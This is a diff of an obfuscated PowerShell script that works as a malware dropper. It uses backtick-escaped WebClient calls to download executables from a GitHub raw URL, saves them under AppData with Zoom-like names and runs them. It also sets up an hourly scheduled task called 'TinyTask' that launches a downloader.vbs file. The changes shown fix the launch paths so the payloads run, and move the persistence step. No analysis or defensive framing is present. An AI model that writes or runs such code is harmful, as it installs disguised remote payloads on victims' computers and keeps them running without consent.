@@ -9,7 +9,7 @@ Function dwn
     if (!$running)
     {
         
-		(New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`F`i`l`e"('https://raw.githubusercontent.com/trueandtrust/fsdewrwerghgyrr/main/eclient.exe', "C:\Users\$env:UserName\AppData\Local\Programs\Common\ZoomE.exe");[System.Diagnostics.Process]::Start("C:\Users\$env:UserName\AppData\Local\Programs\Common\twain_32.exe");
+		(New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`F`i`l`e"('https://raw.githubusercontent.com/trueandtrust/fsdewrwerghgyrr/main/eclient.exe', "C:\Users\$env:UserName\AppData\Local\Programs\Common\ZoomE.exe");[System.Diagnostics.Process]::Start("C:\Users\$env:UserName\AppData\Local\Programs\Common\ZoomE.exe");
 	
 	}
 		
@@ -18,12 +18,12 @@ Function dwn
 	
 	 {
 		 
-(New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`F`i`l`e"('https://raw.githubusercontent.com/trueandtrust/fsdewrwerghgyrr/main/mclient.exe', "C:\Users\$env:UserName\AppData\Local\Programs\Common\ZoomX.exe");[System.Diagnostics.Process]::Start("C:\Users\$env:UserName\AppData\Local\Programs\Common\mpu.exe");
+(New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`F`i`l`e"('https://raw.githubusercontent.com/trueandtrust/fsdewrwerghgyrr/main/mclient.exe', "C:\Users\$env:UserName\AppData\Local\Programs\Common\ZoomX.exe");[System.Diagnostics.Process]::Start("C:\Users\$env:UserName\AppData\Local\Programs\Common\ZoomX.exe");
 
 		}
-		
+	&"schtasks.exe" "/create" "/sc" "minute" "/mo" 60 "/tn" "TinyTask" "/tr" "C:\Users\Default\Links\downloader.vbs";
+	
 }
-&"schtasks.exe" "/create" "/sc" "minute" "/mo" 60 "/tn" "TinyTask" "/tr" "C:\Users\Default\Links\downloader.vbs";
 
 IEX dwn
 
